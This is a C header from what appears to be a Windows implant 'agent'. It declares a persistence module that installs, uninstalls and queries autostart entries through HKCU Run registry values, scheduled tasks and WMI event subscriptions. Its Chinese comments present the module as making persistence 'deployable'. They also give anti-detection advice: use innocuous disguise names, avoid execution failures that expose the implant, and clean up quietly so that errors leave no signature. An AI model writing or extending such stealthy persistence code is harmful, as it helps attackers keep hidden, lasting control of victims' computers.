/*
 * agent_windows/include/persist_win.h
 *
 * Windows 持久化：程序化安装 / 卸载 / 查询。
 *
 * 与 09_persistence 的分工（不重复实现）：
 *   09_persistence —— 生成载荷文本（"reg add ..." / "schtasks /create ..."），
 *                     只产出字符串供人工或上层使用，不调用任何 Windows API，
 *                     也没有卸载与状态查询能力。
 *   本模块         —— 真实调用 Windows API 完成安装，并支持卸载与状态查询。
 *                     这是把"生成文本"推进到"可部署"的那一层。
 *
 * 三种机制：
 *   PW_REG_RUN   —— HKCU\Software\Microsoft\Windows\CurrentVersion\Run 值。
 *                   走真实 advapi32 API（RegCreateKeyExW / RegSetValueExW /
 *                   RegDeleteValueW / RegQueryValueExW），在 winshim 下用
 *                   有状态注册表 mock 完整验证。
 *   PW_SCHTASK   —— 计划任务。构造 schtasks 命令行，经注入的 exec 回调执行。
 *   PW_WMI_EVENT —— WMI 事件订阅（__EventFilter + CommandLineEventConsumer
 *                   + __FilterToConsumerBinding）。构造 PowerShell 命令行，
 *                   经 exec 回调执行。
 *
 * 反检测要点：
 *   1. 默认伪装名不含产品特征串；调用方可指定任意 innocuous 名称。
 *   2. 命令行含空格时用引号包裹，避免解析歧义导致执行失败（失败即暴露）。
 *   3. 卸载走幂等路径：清理不存在的项不报错。重复清理产生可观测错误
 *      本身就是特征，且会中断上层清理流程。
 *   4. PowerShell 内嵌命令的单引号按 ''. 转义，否则命令破损。
 *
 * 已知与真机的差异：
 *   shim 中 WCHAR 为 4 字节 wchar_t，真机为 UTF-16（2 字节）。字符串转换
 *   走 MultiByteToWideChar，shim 提供 ASCII 等价实现；非 ASCII 路径的
 *   UTF-16 行为需真机验证。
 */
#ifndef DAYANJING_AGENT_WINDOWS_PERSIST_WIN_H
#define DAYANJING_AGENT_WINDOWS_PERSIST_WIN_H

#include <stddef.h>

#ifdef __cplusplus
extern "C" {
#endif

typedef enum {
    PW_REG_RUN = 0,   /* HKCU Run 注册表值 */
    PW_SCHTASK,       /* 计划任务 */
    PW_WMI_EVENT,     /* WMI 事件订阅 */
    PW_COUNT
} pw_method_t;

typedef enum {
    PW_OK = 0,
    PW_ERR_PARAM,   /* 入参为空 / 方法越界 */
    PW_ERR_NAME,    /* 名称非法：空、超长、含分隔符或控制字符 */
    PW_ERR_CMD,     /* 命令行非法：空、超长 */
    PW_ERR_API,     /* Windows API 失败（仅注册表路径） */
    PW_ERR_EXEC,    /* 外部命令执行回调返回失败 */
    PW_ERR_CAP      /* 输出缓冲不足 */
} pw_err_t;

#define PW_NAME_MAX 64
#define PW_CMD_MAX  1024

/* pw_build_cmd 的模式 */
#define PW_MODE_INSTALL   0
#define PW_MODE_UNINSTALL 1
#define PW_MODE_QUERY     2

/*
 * 执行外部命令回调。cmd 为完整命令行（UTF-8）。成功返回 0，非 0 视为失败。
 * 注入式而非直接 system()：既避免真实部署时留下不可控的执行痕迹，
 * 也使测试能验证命令行正确性而不真的改动系统。
 */
typedef int (*pw_exec_t)(const char *cmd, void *ud);

typedef struct {
    const char *name;     /* 伪装名：注册表值名 / 任务名 / 过滤器名 */
    const char *cmdline;  /* 开机或触发时要执行的命令行 */
    pw_exec_t   exec;     /* SCHTASK / WMI_EVENT 必需；REG_RUN 不使用 */
    void       *exec_ud;
} pw_cfg_t;

/* 安装。已存在时覆盖为当前 cmdline（幂等）。成功返回 PW_OK。 */
int pw_install(pw_method_t m, const pw_cfg_t *cfg);

/* 卸载。项不存在时也返回 PW_OK（幂等清理）。 */
int pw_uninstall(pw_method_t m, const pw_cfg_t *cfg);

/*
 * 查询是否已安装。*installed 置 1 / 0。
 * 注册表路径走真实 API；SCHTASK / WMI 走 exec 回调执行查询命令，
 * 回调返回 0 视为已安装。
 */
int pw_query(pw_method_t m, const pw_cfg_t *cfg, int *installed);

/*
 * 构造 SCHTASK / WMI_EVENT 的命令行（mode 见 PW_MODE_*）。
 * 返回写入长度（不含终止符），失败返回 0。
 * 暴露此接口使命令行可被直接断言，无需依赖 exec 副作用。
 */
size_t pw_build_cmd(pw_method_t m, int mode, const pw_cfg_t *cfg,
                    char *out, size_t cap);

const char *pw_errstr(pw_err_t e);
const char *pw_method_name(pw_method_t m);

#ifdef __cplusplus
}
#endif

#endif /* DAYANJING_AGENT_WINDOWS_PERSIST_WIN_H */
